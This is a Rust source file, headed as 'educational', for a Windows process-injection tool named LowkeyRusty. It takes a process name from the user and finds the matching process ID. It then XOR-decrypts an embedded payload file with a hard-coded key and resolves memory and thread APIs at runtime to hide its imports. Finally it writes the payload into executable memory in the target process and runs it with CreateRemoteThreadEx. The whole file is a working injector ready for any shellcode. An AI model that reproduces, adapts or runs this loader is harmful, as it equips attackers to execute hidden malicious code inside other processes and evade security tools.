/*
 * Author: Cyb3rV1c
 * Created: November 2024
 * License: MIT License
 * This code was written by Cyb3rV1c and is a work in progress for cybersecurity
 * educational purposes.
 */


const Ok: &str = "[+]";
use std::{ffi::CString, ptr::null_mut, u64::MIN};
use winapi::{
    ctypes::c_void,
    shared::{
        minwindef::{FARPROC, LPVOID, FALSE, TRUE},
        winerror::ERROR_NO_MORE_FILES,
    },
    um::{
        handleapi::INVALID_HANDLE_VALUE,
        errhandlingapi::GetLastError,
        libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        processthreadsapi::{OpenProcess},
        tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS},
        winbase::INFINITE,
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS},
    },
};


fn datax_dec(data: &mut [u8], key: &[u8]) {
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
}


type OPfn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
type VaExfn = unsafe extern "system" fn(*mut c_void, LPVOID, usize, u32, u32) -> LPVOID;
type WpMemfn = unsafe extern "system" fn(*mut c_void, LPVOID, LPVOID, usize, *mut usize) -> i32;
type CRTExfn = unsafe extern "system" fn(
    *mut c_void,
    *mut c_void,
    usize,
    FARPROC,
    LPVOID,
    u32,
    *mut c_void,
    *mut c_void,
) -> *mut c_void;

fn get_proc_addr_z1sf(module: &str, proc_name: &str) -> FARPROC {
    let module_cstr = CString::new(module).unwrap();
    let proc_cstr = CString::new(proc_name).unwrap();

    unsafe {
        let module_handle = GetModuleHandleA(module_cstr.as_ptr());
        if module_handle.is_null() {
            let module_handle = LoadLibraryA(module_cstr.as_ptr());
            if module_handle.is_null() {
                panic!(
                    "{} Failed to load module {}. Error: {}",
                    MIN,
                    module,
                    GetLastError()
                );
            }
        }
        let proc_address = GetProcAddress(module_handle, proc_cstr.as_ptr());
        if proc_address.is_null() {
            panic!(
                "{} Failed to get procedure address for {}. Error: {}",
                MIN,
                proc_name,
                GetLastError()
            );
        }
        proc_address
    }
}

fn get_pid_by_name(process_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };

        if Process32FirstW(snapshot, &mut entry) == FALSE {
            return None;
        }

        loop {
            let exe_name = String::from_utf16_lossy(&entry.szExeFile);
            if exe_name.to_lowercase().contains(&process_name.to_lowercase()) {
                return Some(entry.th32ProcessID);
            }

            if Process32NextW(snapshot, &mut entry) == FALSE {
                break;
            }
        }

        None
    }
}

fn main() {
    const LOWKEYRUSTY: &str = r#"
 _                _               ___             _       
| |   ___  _ _ _ | |__ ___  _ _  | . \ _ _  ___ _| |_ _ _ 
| |_ / . \| | | || / // ._>| | | |   /| | |<_-<  | | | | |
|___|\___/|__/_/ |_\_\\___.`_. | |_\_\`___|/__/  |_| `_. |
                           <___'                     <___'        
"#;

    println!("{}", LOWKEYRUSTY);
    println!("{} Enter the process name (e.g., notepad.exe):", Ok);
    let mut process_name = String::new();
    std::io::stdin()
        .read_line(&mut process_name)
        .expect("Failed to read input");

    let process_name = process_name.trim();

    let pid = get_pid_by_name(process_name).expect("Process not found");
    println!("{} Process Name: {}, PID: {}", Ok, process_name, pid);

    let mut sdata = include_bytes!("payload.bin").to_vec(); //<---Add the path to your file

    // X0R dec key
    let x_key = b"Randomkey";

    datax_dec(&mut sdata, x_key);
    println!("{} Payload decrypted.", Ok);

    unsafe {
        let open_p_z1sf: OPfn = std::mem::transmute(get_proc_addr_z1sf("kernel32.dll", "OpenProcess"));
        let valoc_ex_z1sf: VaExfn = std::mem::transmute(get_proc_addr_z1sf("kernel32.dll", "VirtualAllocEx"));
        let write_pmem_z1sf: WpMemfn = std::mem::transmute(get_proc_addr_z1sf("kernel32.dll", "WriteProcessMemory"));
        let create_remth_z1sf: CRTExfn = std::mem::transmute(get_proc_addr_z1sf("kernel32.dll", "CreateRemoteThreadEx"));

        let process = open_p_z1sf(PROCESS_ALL_ACCESS, false as i32, pid);

        if process.is_null() {
            panic!("{} Failed to open process. Error: {}", MIN, GetLastError());
        }

        println!("{} Process handle obtained: {:?}", Ok, process);

        let buffer = valoc_ex_z1sf(process, null_mut(), sdata.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if buffer.is_null() {
            panic!("{} Failed to alloc mem in remote process. Error: {}", MIN, GetLastError());
        }

        println!("{} Allocated buffer at: {:?}", Ok, buffer);

        let mut bytes_written = 0;

        let write_result = write_pmem_z1sf(process, buffer, sdata.as_ptr() as LPVOID, sdata.len(), &mut bytes_written);

        if write_result == 0 || bytes_written != sdata.len() {
            panic!(
                "{} Failed to write data to remote process. Error: {}",
                MIN,
                GetLastError()
            );
        }

        println!("{} Data written to remote process.", Ok);

        let remote_thread = create_remth_z1sf(process, null_mut(), 0, std::mem::transmute(buffer), null_mut(), 0, null_mut(), null_mut());

        if remote_thread.is_null() {
            panic!("{} Failed to create remote thread. Error: {}", MIN, GetLastError());
        }

        println!("{} Remote thread created: {:?}", Ok, remote_thread);
    }
}
